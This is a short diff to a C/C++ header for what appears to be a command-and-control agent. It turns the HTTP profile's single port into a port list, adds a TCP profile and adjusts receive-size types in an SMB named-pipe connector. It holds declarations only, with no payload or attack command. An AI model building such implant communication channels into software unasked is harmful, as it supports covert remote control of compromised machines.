@@ -7,9 +7,9 @@
 #ifndef PROFILE_STRUCT
 #define PROFILE_STRUCT
 typedef struct {
-	WORD   port;
 	ULONG  servers_count;
 	BYTE** servers;
+	WORD*  ports;
 	BOOL   use_ssl;
 	BYTE*  http_method;
 	BYTE*  uri;
@@ -23,6 +23,11 @@ typedef struct {
 typedef struct {
 	BYTE* pipename;
 } ProfileSMB;
+
+typedef struct {
+	BYTE* prepend;
+	WORD  port;
+} ProfileTCP;
 #endif
 
 #define DECL_API(x) decltype(x) * x
@@ -59,7 +64,7 @@ class ConnectorSMB
 	CHAR* pipename = NULL;
 
 	BYTE* recvData   = NULL;
-	DWORD recvSize   = 0;
+	int   recvSize   = 0;
 	ULONG allocaSize = 0;
 
 	SMBFUNC* functions = NULL;
@@ -77,6 +82,6 @@ public:
 
 	void  SendData(BYTE* data, ULONG data_size);
 	BYTE* RecvData();
-	DWORD RecvSize();
+	int RecvSize();
 	void  RecvClear();
 };
